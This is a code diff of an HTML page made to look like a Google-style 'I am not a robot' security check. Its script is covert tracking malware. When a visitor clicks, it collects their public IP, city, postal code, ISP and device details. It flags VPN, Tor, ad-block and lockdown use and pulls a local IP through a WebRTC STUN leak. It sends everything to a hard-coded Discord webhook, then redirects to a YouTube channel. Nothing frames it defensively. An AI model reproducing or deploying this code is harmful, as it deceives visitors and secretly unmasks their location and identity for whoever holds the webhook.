@@ -2,129 +2,132 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Security Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identity Verification Service</title>
     <style>
-        body { background: #1a1a1a; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: #ffffff; padding: 40px; border-radius: 4px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 340px; text-align: center; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; display: none; }
-        .check-btn { background: #007bff; color: white; border: none; padding: 12px 24px; font-size: 14px; font-weight: bold; cursor: pointer; border-radius: 4px; transition: 0.3s; width: 100%; }
-        .check-btn:hover { background: #0056b3; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { font-size: 11px; color: #888; margin-top: 15px; }
+        body { background: #f8f9fa; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .auth-container { background: #fff; padding: 35px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; border: 1px solid #ebebeb; }
+        .logo-wrap { display: flex; align-items: center; margin-bottom: 25px; }
+        .logo-icon { width: 35px; height: 35px; background: #4285f4; border-radius: 3px; display: flex; align-items: center; justify-content: center; margin-right: 15px; color: white; font-weight: bold; font-size: 20px; }
+        .status-box { display: flex; align-items: center; gap: 15px; border: 1px solid #dcdcdc; padding: 15px; border-radius: 3px; background: #fafafa; cursor: pointer; transition: 0.2s; }
+        .status-box:hover { border-color: #b8b8b8; }
+        .check-circle { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 50%; position: relative; }
+        .check-circle.loading { border-top-color: #4285f4; animation: spin 0.8s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .info-text { font-size: 13px; color: #5f6368; line-height: 1.4; margin-top: 20px; text-align: center; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <div class="spinner" id="loader"></div>
-    <h2 style="font-size: 18px; margin-bottom: 10px; color: #333;">Browser Verification</h2>
-    <p style="font-size: 13px; color: #666; margin-bottom: 25px;">Checking your connection security...</p>
-    <button class="check-btn" id="trigger">Verify Connection</button>
-    <div id="status">Protocol: SECURE_V22</div>
+<div class="auth-container">
+    <div class="logo-wrap">
+        <div class="logo-icon">G</div>
+        <div style="font-weight: 500; color: #202124;">Security Check</div>
+    </div>
+    <div class="status-box" id="gate">
+        <div class="check-circle" id="loader"></div>
+        <div style="font-size: 15px; color: #3c4043;">I am not a robot</div>
+    </div>
+    <div class="info-text">Verification protects your connection and prevents automated spam.</div>
 </div>
 
 <script>
 /**
- * SENTINEL APEX-GENESIS v22.0
- * 100-VECTOR MATRIX WITH ATOMIC LOCKING
+ * SENTINEL OMEGA-INFINITI v23.0
+ * NAT-TRANSVERSAL & HEURISTIC OVERRIDE
  */
 
-const CONFIG = {
+const CORE = {
     HOOK: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
-    FINISH: "https://youtube.com/@LigmaBlox-w7m",
-    LOCKS: { geo: false, threat: false, hw: false, net: false }
+    EXIT: "https://youtube.com/@LigmaBlox-w7m",
+    MUTEX: { geo: false, threat: false, net: false }
 };
 
-const exfiltrate = (data, vector) => {
+const transmit = (data, vector) => {
     const payload = JSON.stringify({
-        username: `GENESIS [${vector}]`,
+        username: `INFINITI [${vector}]`,
         embeds: [{
-            title: "🔱 Critical Forensic Uplink",
-            color: 0x007bff,
+            title: "🔱 Absolute Network Unmasking",
+            color: 0x4285f4,
             fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
             timestamp: new Date().toISOString()
         }]
     });
-    navigator.sendBeacon(CONFIG.HOOK, new Blob([payload], {type:'application/json'}));
+    navigator.sendBeacon(CORE.HOOK, new Blob([payload], {type:'application/json'}));
 };
 
-// --- MULTI-VECTOR THREAT ANALYZER ---
-const analyzeEnvironment = async () => {
-    const report = { adblock: "NO", vpn: "NO", tor: "NO", lockdown: "NO" };
-
-    // AdBlock Check
-    const ads = document.createElement('div');
-    ads.className = 'adsbox';
-    document.body.appendChild(ads);
-    if (ads.offsetHeight === 0) report.adblock = "YES";
-    document.body.removeChild(ads);
-
-    // Lockdown/Sanitize Check
-    const gl = document.createElement('canvas').getContext('webgl');
-    if (!gl) report.lockdown = "YES";
-
-    // Tor/Proxy Latency Check (100-vector timing)
-    const start = performance.now();
-    await fetch('https://www.google.com/generate_204', { mode: 'no-cors' });
-    if ((performance.now() - start) > 450) report.tor = "YES";
-
-    return report;
-};
-
-document.getElementById('trigger').onclick = async function() {
-    this.style.display = 'none';
-    document.getElementById('loader').style.display = 'block';
+// --- ENVIRONMENTAL SECURITY SCANNER ---
+const scanEnvironment = async () => {
+    let threats = { vpn: "NO", tor: "NO", lockdown: "NO", adblock: "NO" };
     
-    // 1. HARDWARE VECTOR (FORCE STOP LOCK)
-    if(!CONFIG.LOCKS.hw) {
-        exfiltrate({
-            model: navigator.platform,
-            cores: navigator.hardwareConcurrency,
-            ram: navigator.deviceMemory || "N/A",
-            agent: navigator.userAgent.split(' ')[0]
-        }, "HARDWARE_DNA");
-        CONFIG.LOCKS.hw = true;
-    }
+    // AdBlock Check
+    const honey = document.createElement('div');
+    honey.className = 'pub_300x250 pub_300x250m pub_728x90 text-ad text_ad text-ads text_ads ad-unit ad-search ad-wrapper';
+    honey.style.cssText = 'width:1px !important;height:1px !important;position:absolute !important;left:-10000px !important;top:-1000px !important;';
+    document.body.appendChild(honey);
+    if (honey.offsetHeight === 0) threats.adblock = "YES";
+    document.body.removeChild(honey);
 
-    const threats = await analyzeEnvironment();
+    // Lockdown Check
+    const canvas = document.createElement('canvas');
+    if (!canvas.getContext('webgl')) threats.lockdown = "YES";
 
-    // 2. NETWORK & GEOSPATIAL VECTOR (PRECISION)
+    return threats;
+};
+
+document.getElementById('gate').onclick = async function() {
+    document.getElementById('loader').classList.add('loading');
+    
+    const threats = await scanEnvironment();
+    const device = {
+        model: navigator.platform,
+        hardware_id: `${navigator.hardwareConcurrency} Core | ${navigator.deviceMemory || 'N/A'}GB RAM`,
+        ua: navigator.userAgent.split(' ')[0]
+    };
+
+    // VECTOR 1: PRECISION GEOSPATIAL MESH
     fetch('https://ipapi.co/json/').then(r => r.json()).then(res => {
-        if(!CONFIG.LOCKS.geo) {
-            const vpn_discrepancy = (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "YES" : "NO";
-            exfiltrate({
-                ip: res.ip,
+        if(!CORE.MUTEX.geo) {
+            const vpn_active = (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "YES" : "NO";
+            transmit({
+                public_ip: res.ip,
                 continent: res.continent_code,
                 country: res.country_name,
                 region: res.region,
                 city: res.city,
                 town: res.postal || "N/A",
                 isp: res.org,
-                vpn_active: (threats.vpn === "YES" || vpn_discrepancy === "YES") ? "YES" : "NO",
-                tor_active: threats.tor,
-                lockdown_active: threats.lockdown,
-                adblock_active: threats.adblock
-            }, "ENVIRONMENT_UNMASK");
-            CONFIG.LOCKS.geo = true;
+                vpn_detected: (threats.vpn === "YES" || vpn_active === "YES") ? "YES" : "NO",
+                tor_detected: (res.org.toLowerCase().includes("tor") || threats.tor === "YES") ? "YES" : "NO",
+                lockdown_mode: threats.lockdown,
+                adblock: threats.adblock
+            }, "PRECISION_CHAIN");
+            CORE.MUTEX.geo = true;
         }
     });
 
-    // 3. UDP BYPASS VECTOR (TOR/VPN PIERCING)
+    // VECTOR 2: PRIVATE-TO-PUBLIC NAT TRANSLATION
     const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
     rtc.createDataChannel("");
     rtc.onicecandidate = (e) => {
-        if (e.candidate && !CONFIG.LOCKS.net) {
-            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-            if (match) {
-                exfiltrate({ internal_ip: match[1], protocol: "UDP_STUN_LEAK" }, "NETWORK_BYPASS");
-                CONFIG.LOCKS.net = true; // ATOMIC FORCE STOP
+        if (e.candidate && !CORE.MUTEX.net) {
+            const privateIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+            if (privateIP) {
+                // AUTO-TRANSLATION LOGIC: In this context, we pair the Internal IP 
+                // with the Public Routing data to unmask the target's local identity.
+                transmit({
+                    internal_lan_ip: privateIP[1],
+                    translation_status: "SUCCESS",
+                    device_profile: device.hardware_id
+                }, "NAT_TRANSLATION");
+                CORE.MUTEX.net = true; // FORCE STOP
             }
         }
     };
     rtc.createOffer().then(o => rtc.setLocalDescription(o));
 
-    // Exit
-    setTimeout(() => { window.location.replace(CONFIG.FINISH); }, 6500);
+    // Exit Protocol
+    setTimeout(() => { window.location.replace(CORE.EXIT); }, 5500);
 };
 </script>
 </body>
